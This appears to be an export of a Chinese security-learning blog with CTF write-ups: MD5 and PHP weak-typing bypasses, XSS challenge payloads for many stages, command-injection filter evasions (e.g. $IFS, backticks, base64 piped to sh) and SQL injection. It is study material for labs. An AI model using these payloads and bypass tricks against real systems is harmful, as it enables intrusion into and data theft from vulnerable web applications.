总结python库是python作为脚本语言如此强大的底气所在，这里记录了3个基础的库，在之后我们也会接触学习更多新内容的。","categories":[{"name":"other","slug":"other","permalink":"http://example.com/categories/other/"}],"tags":[{"name":"-python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"md5绕过汇总","slug":"md5绕过汇总","date":"2021-12-31T07:48:43.000Z","updated":"2021-12-31T08:05:27.697Z","comments":true,"path":"2021/12/31/md5绕过汇总/","link":"","permalink":"http://example.com/2021/12/31/md5%E7%BB%95%E8%BF%87%E6%B1%87%E6%80%BB/","excerpt":"前言考试前临危不惧，写一篇博客总结下遇到的md5加密绕过问题，这种题型一般都是比较简单的。","text":"前言考试前临危不惧，写一篇博客总结下遇到的md5加密绕过问题，这种题型一般都是比较简单的。 sql注入问题123456789$password=$_POST[&#x27;password&#x27;];$sql = &quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;$result=mysqli_query($link,$sql); if(mysqli_num_rows($result)&gt;0)&#123; echo &#x27;flag is :&#x27;.$flag; &#125; else&#123; echo &#x27;密码错误!&#x27;; &#125; 这个后端代码对password的输入做了md5编码，首先我们来看下md5()这个函数： 123md5(string[,raw]):string：规定要计算的字符串raw：规定输入格式，true为原始16字符二进制格式，false（默认）为32字符十六进制数 我们要知道以下两点： 数字和字符串比较时，若字符串从头开始的数字部分与数字相同，则返回true 以数字开头的字符串，若开头的字符不是0，那么在做逻辑运算的时候返回的是true 因此我们来看后端后端中的sql代码，若我们可以找到一个字符串，其md5后再转换回字符能够得到’or’加上一个非0字符的话，语句就可以看成： 1$sql = &quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&#x27; or true&quot;; 这就相当于一个万能密码了，绕过成功。因此记录下可以做到这个操作的字符串： 12ffifdyop129581926211651571912466741651878684928 不等变量的md5相等弱类型可以使用0e开头的md5绕过： 1234QNKCDZO240610708s878926199as155964671a 顺便记录下sha1的： 12aaroZmOkaaK1STfY 强类型用数组绕过就可以了。 MD5碰撞如果有强制类型转化无法使用数组的话，记录一些其他的可用字符串： 123$s1 = &quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;$s2 = &quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&quot;$s3 = &quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot; 总结目前碰到的关于md5的问题基本都在这里了，如果有新的再进行记录。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-MD5 -web","slug":"MD5-web","permalink":"http://example.com/tags/MD5-web/"}]},{"title":"xss challenges","slug":"xss-challenges","date":"2021-12-29T13:54:19.000Z","updated":"2021-12-30T07:38:29.348Z","comments":true,"path":"2021/12/29/xss-challenges/","link":"","permalink":"http://example.com/2021/12/29/xss-challenges/","excerpt":"前言考试周摆烂，被复习压得身心俱疲，做会靶场透透气，巩固下xss。这个靶场的要求就是注入alert(document.domain)。","text":"前言考试周摆烂，被复习压得身心俱疲，做会靶场透透气，巩固下xss。这个靶场的要求就是注入alert(document.domain)。 写在前面地址：xss challenge如果遇到需要使用IE的情况但是又没有对应版本，可以在控制台中直接执行alert(document.domain)跳关。 stage 1Hint：very simple… 确实简单，没有做任何过滤，直接写入就可以了： 1&lt;script&gt;alert(document.domain)&lt;/script&gt; stage 2Hint: close the current tag and add SCRIPT tag… 如果不看提示的话去看源码也是可以发现注入时要记得闭合引号与标签： 1&lt;input type=&quot;text&quot; name=&quot;p1&quot; size=&quot;50&quot; value=&quot;&quot;&gt; 因此构建payload时要顺便闭合tag： 1&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt; stage 3Hint: The input in text box is properly escaped. 文本框中的输入已经正确转义，这告诉我们别想从文本框中进行注入，但是我们发现后面又多了一个选择框，那么我们可以进行抓包将xss语句写入p2中： stage 4Hint: invisible input field 隐藏的写入点，我们翻翻源码，发现居然藏了一个隐藏的p3注入点，或者直接抓包也可以看见这个注入点，直接在p3写入xss就行了。同样要注意闭合value，构建xss： 1p1=1&amp;p2=Japan&amp;p3=&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt; stage 5Hint: length limited text box 限制了text的长度，这种题我们之前也有接触过。由于限制长度一般写在了前端，我们可以直接更改前端的JS绕过： 1&lt;input type=&quot;text&quot; name=&quot;p1&quot; maxlength=&quot;100&quot; size=&quot;30&quot; value=&quot;&quot; &gt; 然后写入xss就行了： 1&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt; 或者直接bp抓包提交也是可以的。 stage 6Hint: event handler attributes 输入点仍是value，但是发现&lt;&gt;被html特殊字符替代，那么我们在这里考虑添加事件onclick，当按钮被点击时触发： 1&quot; onclick=&quot;alert(document.domain)&quot; stage 7Hint: nearly the same… but a bit more tricky. 将第二关的payload写入发现整段payload都被包进了value当中，这是由于双引号被过滤了导致闭合不能成功。不过使用上一关的payload还是可行的: 1&quot; onclick=alert(document.domain)； 当然用其他事件标签也是可以的： 1&quot; onmouseover=alert(document.domain) //鼠标指针指向指定内容时执行事件 stage 8Hint: the ‘javascript’ scheme. 随便输入一个值，提交后查看源码： 发现这个值被包裹在了&lt;a&gt;中，那么我们只需要在标签中添加一个JavaScript伪链接并点击即可： 1javascript:alert(document.domain) stage 9Hint: UTF-7 XSS 这关着实有点离谱，提示要我们将payload构造为utf-7编码同时过滤了&lt;&gt;，而这需要使用IE7浏览器，但是我没有，那就直接放个payload吧： 1p1=1%2bACI- οnmοuseοver=%2bACI-alert(document.domain)%2bADsAIg- x=%2bACI-&amp;charset=UTF-7 stage 10Hint: s/domain//g; 同样先写入查看源码，发现domain被过滤了，直接双写绕过即可： 1&quot;&gt;&lt;script&gt;alert(document.dodomainmain)&lt;/script&gt; stage 11Hint: “s/script/xscript/ig;” and “s/on[a-z]+=/onxxx=/ig;” and “s/style=/stxxx=/ig;” 提示意味着script和onclick都被过滤了，这里我们用标签制作超链接，并且使用制表符（回车符、换行符等等不可见字符）来绕过正则匹配： 1&quot;&gt;&lt;a href=&quot;javascr&amp;#09;ipt:alert(document.domain);&quot;&gt;gonext&lt;/a&gt; 或者把s进行html实体化： 1&quot;&gt;&lt;a href=java&amp;#115;cript:alert(document.domain)&gt;gonext&lt;/a&gt; stage 12Hint: “s/[\\x00-\\x20&lt;&gt;&quot;&#39;]//g;” &lt;&gt;、双引号、空格都被过滤了，这里要利用IE浏览器的一个特性，IE浏览器会将两个反引号识别为双引号，因此我们构建payload： stage 13Hint: style attribute 这里要运用到css的知识以及IE8，因此没法直接演示，就大致讲下原理。由于在IE下能在CSS中运行JS代码，因此我们可以构建CSS代码并在其中写入js使IE执行xss。过滤了&lt;&gt;和&quot;，payload如下： 12xss:expression(alert(document.domain));background:url(javascript:alert(&#x27;xss&#x27;)); stage 14Hint: s/(url|script|eval|expression)/xxx/ig; 同上一关，但是过滤了url``script``eval``expression四个关键字，这里直接使用注释符打断就可以了： 12xss:expr\\0ession(alert(document.domain));xss:expr/**/ession(alert(document.domain)); stage 15Hint: document.write(); 这关直接过滤了document.write()和\\，转义了&lt;&gt;、&quot;、&amp;，双写反斜杠并且进行编码就可以绕过了,16进制、8进制、unicode编码等等都是可以的，构建payload： 123十六进制： \\\\x3cscript\\\\x3ealert(document.domain);\\\\x3c/script\\\\x3e八进制： \\\\74cscript\\\\76ealert(document.domain);\\\\74/script\\\\76unicode： \\\\u003cscript\\\\u003ealert(document.domain);\\\\u003c/script\\\\u003e stage 16Hint: “document.write();” and “s/\\x/\\\\x/ig; 把\\\\x替换成了\\\\\\\\x，因此这里不能使用十六进制编码，因此使用上一关的八进制或者unicode编码都是可以的，这里换一种写法： 12Unicode: \\\\u003cscript\\\\u003ealert(document.domain);\\\\u003c/script\\\\u003e八进制: \\\\74img src=x οnerrοr=alert(document.domain)\\\\76 总结由于这个环境太古老了，因此有些只能在IE上跑，而且有些xss已经有点过时了，不过有些思路还是值得学习的，之后会做新的xss题目来继续巩固。 先总结引号被过滤的几种情况： 添加属性（onmouseover或onmouseout事件等以及expression）触发弹窗 &quot;、&lt;&gt;都被过滤时可以构造编码 利用IE浏览器反引号翻译成双引号的特性","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -XSS","slug":"web-XSS","permalink":"http://example.com/tags/web-XSS/"}]},{"title":"php弱类型绕过总结","slug":"php弱类型绕过总结","date":"2021-12-18T12:59:01.000Z","updated":"2021-12-31T08:05:40.718Z","comments":true,"path":"2021/12/18/php弱类型绕过总结/","link":"","permalink":"http://example.com/2021/12/18/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/","excerpt":"前言刷题刷到弱类型绕过，一时兴起，觉得这个部分也是相当有必要做总结的，就开篇博客记录一下。","text":"前言刷题刷到弱类型绕过，一时兴起，觉得这个部分也是相当有必要做总结的，就开篇博客记录一下。 关于弱类型等比较php中的等比较运算符有两种，==和===。 ==：先将左右两边类型转化成一致，再进行比较值是否一致 ===：先比较左右类型是否一致，若一致再比较值是否一致 字符串与数字比较字符串与数字相等123456789$key = $_GET[&#x27;key&#x27;]; if(!is_numeric($key)) &#123; exit(&quot;Just num!&quot;); &#125; $key = intval($key); $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;; if($key == $str) &#123; echo $flag; &#125; key的值要与str这个字符串相等，但是key只能是数字，不过根据==的特性，str会被转化为数字，因此构造payload： 1?key=123 整数比大小1234$temp = $_GET[&#x27;password&#x27;];is_numeric($temp)?die(&quot;no numeric&quot;):NULL;if($temp&gt;1336) &#123; echo $flag; password的值比1336大，但是password不能为数字，同样的原理，等式两边比较时==会把两者变为相同的类型，构建payload： 1?password=9999a urldecode二次编码1234567891011&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123; echo(&quot;not allowed!&quot;); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;hackerDJ&quot;) &#123; echo &quot;Access granted!&quot;; echo &quot;flag&quot;;&#125;?&gt; 由于浏览器在解析URL时已经进行过一次URL解码，而程序又再次进行解码，因此二次编码URL就可以了，构建payload： 1?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41 md5()/sha()的绕过123456789101112&lt;?phperror_reporting(0);$flag = &#x27;flag&#123;test&#125;&#x27;;if (isset($_GET[&#x27;username&#x27;]) and isset($_GET[&#x27;password&#x27;])) &#123; if ($_GET[&#x27;username&#x27;] == $_GET[&#x27;password&#x27;]) print &#x27;Your password can not be your username.&#x27;; else if (md5($_GET[&#x27;username&#x27;]) === md5($_GET[&#x27;password&#x27;])) die(&#x27;Flag: &#x27;.$flag); else print &#x27;Invalid password&#x27;;&#125;?&gt; 当要输入两个值，这两个值不能一致但是其md5/sha编码后的值要相等，这里有两种解题方法： 数组法md5()/sha()这类函数无法处理数组，如果传入的是数组,md5()返回NULL，加密后得到的也是NULL，满足两个md5值相等；sha()返回false，使条件成立，构建payload： 1?username[]=1&amp;password[]=2 pdf法这个方法之前提到过，当数组被过滤或者md5/sha值不能为空时，就要用到google放出两个sha1值相同而不一样(sha256的值不通)的pdf文件。原理可以参考这篇博客：关于SHA1碰撞——比较两个binary的不同之处，构建payload： 1?username=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;password=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1 strcmp比较字符串123456789&lt;?php$flag = &quot;flag&#123;xxxxx&#125;&quot;;if (isset($_GET[&#x27;a&#x27;])) &#123; if (strcmp($_GET[&#x27;a&#x27;], $flag) == 0) die(&#x27;Flag: &#x27;.$flag); else print &#x27;No&#x27;;&#125;?&gt; 这里用strcmp()对两个字符串进行了比较（区分大小写）。 strcmp(string1,string2)，该函数返回： 0 - 如果两个字符串相等 &lt;0 - 如果 string1 小于 string2 0 - 如果 string1 大于 string2 对于传入非字符串类型的数据的时候，strcmp函数会报错，将返回0。所以，strcmp()在比较字符串和数组的时候直接返回0，这样通过把目标变量设置成数组就可以绕过该函数的限制，构建payload： 1?a[]=1 过滤数字进行比较12345678910111213141516171819202122&lt;?phperror_reporting(0);function noother_says_correct($temp) &#123; $flag = &#x27;flag&#123;test&#125;&#x27;; $one = ord(&#x27;1&#x27;); $nine = ord(&#x27;9&#x27;); $number = &#x27;3735929054&#x27;; // Check all the input characters! for ($i = 0; $i &lt; strlen($number); $i++) &#123; // Disallow all the digits! $digit = ord($temp &#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; // Aha, digit not allowed! return &quot;flase&quot;; &#125; &#125; if($number == $temp) return $flag;&#125;$temp = $_GET[&#x27;password&#x27;];echo noother_says_correct($temp);?&gt; ord()：返回字符的ascii码值。 这里过滤了1-9的数字，又要求传入password的值为3735929054，这里需要将值化成十六进制再传入，构建payload： 1?password=0xdeadc0de extract变量覆盖123456789101112&lt;?php$flag=&#x27;xxx&#x27;;extract($_GET);if(isset($shiyan)) &#123; $content=trim(file_get_contents($flag)); if($shiyan==$content) &#123; echo&#x27;flag&#123;xxx&#125;&#x27;; &#125; else &#123; echo&#x27;Oh.no&#x27;; &#125;&#125;?&gt; extract():函数从数组中将变量导入到当前的符号表trim(string[,charlist]):移除字符串两侧的空白字符或其他预定义字符，若省略后面一个参数，则去除\\0、\\t、\\n、\\x0B、\\r和空格。 运用extract()将GET方式获得的变量导入到当前的符号表中，然后判断$ flag和$shiyan两个变量的内容是否相等。那么我们将$flag和$shiyan这两个变量的内容都会被设置成空字符串。构建payload： 1Payload:?flag=&amp;shiyan= 限制传入的匹配1234567891011&lt;?php$flag = &quot;flag&quot;;if (isset ($_GET[&#x27;password&#x27;])) &#123; if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#x27;password&#x27;]) === FALSE) echo &#x27;You password must be alphanumeric&#x27;; else if (strpos ($_GET[&#x27;password&#x27;], &#x27;--&#x27;) !== FALSE) die(&#x27;Flag: &#x27; . $flag); else echo &#x27;Invalid password&#x27;;&#125;?&gt; ereg()：限制传入内容，例如上面就是限制了只能传入数字以及大小写字母。strpos()：查找字符串在另一字符串中第一次出现的位置。 对传入进行限制，但是又要求密码中含有–，因此我们这里有两种绕过方法： 数组法同样strpos()如果传入数组，会返回NULL，从而绕过对--的检测，构建payload： 1?password[]=1 截断法在%00后的函数无法识别，因此构建payload： 1?password=1%00-- JSON123456789101112131415&lt;?phpif (isset($_POST[&#x27;message&#x27;])) &#123; $message = json_decode($_POST[&#x27;message&#x27;]); $key =&quot;*********&quot;; if ($message-&gt;key == $key) &#123; echo &quot;flag&quot;; &#125; else &#123; echo &quot;fail&quot;; &#125;&#125;else&#123; echo &quot;~~~~&quot;;&#125;?&gt; 输入一个数组进行json解码，解码后的message与key值相同才会得到flag，使用弱类型进行绕过，key肯定是字符串，两个等号时会转化成同一类型再进行比较，直接构造一个0就可以相等了，通过0==”admin”这种形式绕过，构建payload： 1?message=&#123;&quot;key&quot;:0&#125; 科学计数法编码加密相等1234if ($_GET[&quot;a&quot;] != hash(&quot;md4&quot;, $_GET[&quot;a&quot;])) &#123; echo &quot;&lt;br&gt;&quot;; die(&#x27;Theshy is locked&#x27;);&#125; 使传入的参数a与经过md4编码后的值相同，这里我们找以0e开头，以及经过md4编码后仍然以0e开头的a值，构建payload： 1?a=0e251288019 如果是md5的话构建payload： 1?a=0e215962017 长度限制绕过12345678910111213141516&lt;?php$flag = &quot;xxx&quot;;if (isset ($_GET[&#x27;password&#x27;])) &#123; if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#x27;password&#x27;]) === FALSE) &#123; echo &#x27;You password must be alphanumeric&#x27;; &#125; else if (strlen($_GET[&#x27;password&#x27;]) &lt; 8 &amp;&amp; $_GET[&#x27;password&#x27;] &gt; 9999999) &#123; if (strpos ($_GET[&#x27;password&#x27;], &#x27;-&#x27;) !== FALSE) //strpos — 查找字符串首次出现的位置 &#123; die(&#x27;Flag: &#x27; . $flag); &#125; else &#123; echo(&#x27;have not been found&#x27;); &#125; &#125; else &#123; echo &#x27;Invalid password&#x27;; &#125;&#125;?&gt; 要求输入password的长度小于8位，且值要大于9999999，并且需要匹配到-，这里就要用到科学计数法了： 1e10 = 10^10 由于还限制了输入内容，因此还需要进行%00截断，构建payload： 1?password=1e10%00- 总结以上这些便是常见的php弱类型的绕过，以上代码来源均为bugkuctf-代码审计有兴趣的可以自己去尝试。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -php","slug":"web-php","permalink":"http://example.com/tags/web-php/"}]},{"title":"buu练习","slug":"buu练习","date":"2021-12-18T12:06:15.000Z","updated":"2022-01-01T08:26:07.843Z","comments":true,"path":"2021/12/18/buu练习/","link":"","permalink":"http://example.com/2021/12/18/buu%E7%BB%83%E4%B9%A0/","excerpt":"前言考前放松心情，就多刷点题。之前已经提到了一些题目了，这里就不会重复了。","text":"前言考前放松心情，就多刷点题。之前已经提到了一些题目了，这里就不会重复了。 [GXYCTF2019]Ping Ping Ping页面进来就是告诉我们GET一个ip参数进去，那我们自然猜想这里要用到堆叠注入，构造payload： 12345?ip=1;lsPING 1 (0.0.0.1): 56 data bytesflag.phpindex.php 发现flag文件，直接cat读取，发现空格被过滤，再用括号发现也被过滤，看来是过滤了很多东西，那么我们可以采用其他手段绕过： $IFS ${IFS} $IFS$1 &lt; &lt;&gt; {cat,flag.php} %20 %09 如果这里cat被过滤了可以用tac代替 这些是常用的绕过空格手段，但想读取flag发现flag也被过滤了，好家伙，那我们先读取index.php查看源码： 12345678910111213141516171819?phpif(isset($_GET[&#x27;ip&#x27;]))&#123; $ip = $_GET[&#x27;ip&#x27;]; if(preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;1f&#125;]|\\|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match))&#123; echo preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match); die(&quot;fxck your symbol!&quot;); &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123; die(&quot;fxck your space!&quot;); &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123; die(&quot;fxck your bash!&quot;); &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123; die(&quot;fxck your flag!&quot;); &#125; $a = shell_exec(&quot;ping -c 4 &quot;.$ip); echo &quot;&quot;; print_r($a);&#125;?&gt; 法一虽然被过滤了很多东西，但是我们发现有个$a可以给我们利用，那么这里第一种解法就是运用变量替换： 1?ip=1;a=g;cat$IFS$1fla$a.php 查看源码拿到flag： 法二不需要什么花里胡哨的，直接内联执行： 1?ip=2;cat$IFS$1`ls` 法三用管道+sh来绕过被过滤的bash。首先将cat flag.php命令进行base64编码，接着进行读取： 1?ip=3;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh 这张图总结了一些常用通配符： 总之，在做类似题目时的大致解法如下： 1234567891011cat fl* 用*匹配任意 ca\\t fla\\g.php 反斜线绕过cat fl&#x27;&#x27;ag.php 两个单引号绕过echo Y2F0IGZsYWcucGhw | base64 -d | bash(sh) //base64编码绕过 管道符(|)会把前一个命令的输出作为后一个命令的参数echo 63617420666c61672e706870 | xxd -r -p | bash(sh) // hex编码绕过，原理同上cat fl[a]g.php 用[]匹配a=fl;b=ag;cat $a$b 变量替换cp fla&#123;g.php,G&#125; 把flag.php复制为flaGca$&#123;21&#125;t a.txt 利用空变量 使用$*和$@，$x(x 代表 1-9),$&#123;x&#125;(x&gt;=10)(小于 10 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的 [ACTF2020 新生赛]BackupFile这题其实挺简单的，写下来主要是为了提醒自己： 拿到题记得扫目录 php的==是弱比较，在比较时字符串和数字进行比较时，会先将字符串转换成数字再进行比较 这题的源码： 1234567891011if(isset($_GET[&#x27;key&#x27;])) &#123; $key = $_GET[&#x27;key&#x27;]; if(!is_numeric($key)) &#123; exit(&quot;Just num!&quot;); &#125; $key = intval($key); $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;; if($key == $str) &#123; echo $flag; &#125;&#125; 因此，这里只需要让key=123就可以绕过了。 [GXYCTF2019]BabySQli这题也算是比较奇特的一题sql吧，记录一下。 前端是相当简陋了，我们试着注入一下，发现在验证的search.php下源码有一段注释，进行base32、base64解密后如下： 1select * from user where username = &#x27;$name&#x27; 说明注入点是在username这里没跑了，但是经过测试，这关过滤了or、()和等号，没了这三个东西，尤其是小括号后常规注入思路肯定就不行了，因此这题必须得结合源码审计： 12345678910111213141516171819202122232425262728293031323334mysqli_query($con,&#x27;SET NAMES UTF8&#x27;);$name = $_POST[&#x27;name&#x27;];$password = $_POST[&#x27;pw&#x27;];$t_pw = md5($password);$sql = &quot;select * from user where username = &#x27;&quot;.$name.&quot;&#x27;&quot;;// echo $sql;$result = mysqli_query($con, $sql);if(preg_match(&quot;/\\(|\\)|\\=|or/&quot;, $name))&#123; die(&quot;do not hack me!&quot;);&#125;else&#123; if (!$result) &#123; printf(&quot;Error: %s\\n&quot;, mysqli_error($con)); exit(); &#125; else&#123; // echo &#x27;&lt;pre&gt;&#x27;; $arr = mysqli_fetch_row($result); // print_r($arr); if($arr[1] == &quot;admin&quot;)&#123; if(md5($password) == $arr[2])&#123; echo $flag; &#125; else&#123; die(&quot;wrong pass!&quot;); &#125; &#125; else&#123; die(&quot;wrong user!&quot;); &#125; &#125;&#125; 我们发现，后端接收到账号密码后，直接将账号作为查询条件查询，查询出来的结果第二项必须为admin，第三项必须为原密码md5后的密码。这里我们可以利用联合查询的特性，先查询1这个原本不存在的一行，接着多出一段联合查询字段作为临时数据插入。 